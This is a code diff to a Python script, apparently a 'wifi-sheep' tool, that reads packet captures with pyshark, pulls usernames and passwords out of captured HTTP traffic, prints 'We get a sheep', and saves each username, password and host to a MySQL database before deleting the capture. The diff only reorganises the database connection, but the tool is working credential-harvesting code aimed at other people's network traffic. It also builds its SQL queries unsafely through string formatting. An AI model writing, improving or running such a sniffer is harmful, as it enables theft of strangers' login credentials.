@@ -3,19 +3,15 @@ import pymysql
 import sys
 import datetime
 import os
+import pexpect
 
-def analyze(str):
-	try:
-		db = pymysql.connect(host="localhost",port=8889,user="root",passwd="root",db="wifi-sheep")
-	except:
-		print("error connect to db")
-		sys.exit()
+def analyze(iterator):
+	db  = ""
+	filename = 'data' + str(iterator) + '.cap'
 
-	cursor = db.cursor()
-	
-	filename = 'data' + str + '.cap'
 	cap = pyshark.FileCapture(filename)
-	print("starting analyzing" + str + "package")	
+
+	print("analyzing " + filename)
 
 	userNamePatternList = ['"u"','username','userid']
 	passwordPatternList = ['"p"','password']
@@ -33,26 +29,32 @@ def analyze(str):
 			for usernamePat in userNamePatternList:
 				if usernamePat in text:
 					prePos = text.find(usernamePat)
-					username = text[text.find('=',prePos)+3:text.find('\n\t',prePos)-1]	
+					username = text[text.find('=',prePos)+3:text.find('\n\t',prePos)-1]
 					break;
-		
 			for passwordPat in passwordPatternList:
-                        	if passwordPat in text:
-                                	prePos = text.find(passwordPat)
-                                	password = text[text.find('=',prePos)+3:text.find('\n\t',prePos)-1]
-                                	break;
-               	
+				if passwordPat in text:
+					prePos = text.find(passwordPat)
+					password = text[text.find('=',prePos)+3:text.find('\n\t',prePos)-1]
+					break;
 			if username != "" and password != "":
-				source = pkt["HTTP"].get_field("HOST") 
-				print(username)
-				print(password)
-				print(source)
+				source = pkt["HTTP"].get_field("HOST")
+				print("We get a sheep")
+				print(username,password,source)
+				if db == "":
+					try:
+						db = pymysql.connect(host="localhost",port=8889,user="root",passwd="root",db="wifi-sheep")
+					except:
+						print("error connect to db")
+						sys.exit()
+
+					cursor = db.cursor()
 				cursor.execute("insert into wifisheep_userinfo (userName, password, source, time)\
-					 values ('%s','%s','%s','%s')"%\
+					values ('%s','%s','%s','%s')"%\
 					(username,password,source,datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
 
-	cursor.close()
-	db.commit()
-	db.close()
+	if db != "":
+		cursor.close()
+		db.commit()
+		db.close()
 	os.system("rm " + filename)
 
